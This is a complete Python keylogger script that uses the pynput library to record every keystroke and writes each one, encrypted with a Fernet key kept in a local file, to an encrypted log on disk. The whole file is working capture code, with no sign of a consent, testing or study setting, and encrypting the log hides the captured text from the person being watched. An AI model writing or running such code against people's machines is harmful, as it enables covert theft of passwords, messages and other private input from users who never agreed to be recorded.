from pynput import keyboard
from cryptography.fernet import Fernet
import os

KEY_FILE_PATH = 'key.key'
LOG_FILE_PATH = 'secure_log.enc'

# Function to generate a key and write it to a file if it doesn't exist
def generate_key():
    if not os.path.exists(KEY_FILE_PATH):
        key = Fernet.generate_key()
        with open(KEY_FILE_PATH, 'wb') as key_file:
            key_file.write(key)

# Function to load the key from the file
def load_key():
    with open(KEY_FILE_PATH, 'rb') as key_file:
        key = key_file.read()
    return key

# Ensure the key exists
generate_key()
key = load_key()
cipher_suite = Fernet(key)

# Function to save logs securely
def save_log(data):
    encrypted_data = cipher_suite.encrypt(data.encode())
    with open(LOG_FILE_PATH, 'ab') as file:
        file.write(encrypted_data + b"\n")

def on_press(key):
    try:
        save_log(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            save_log(" ")
        else:
            save_log(f" {key} ")

# Listen for keystrokes
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
